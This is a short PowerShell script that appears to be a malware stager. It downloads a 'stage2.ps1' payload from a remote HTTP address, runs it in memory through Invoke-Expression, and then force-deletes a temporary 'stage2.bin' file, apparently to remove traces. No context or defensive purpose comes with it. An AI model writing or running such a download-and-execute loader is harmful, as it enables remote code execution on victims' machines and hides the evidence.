
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://192.0.2.62:8080/stage2.ps1",
    [int]$TimeoutSec = 30
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
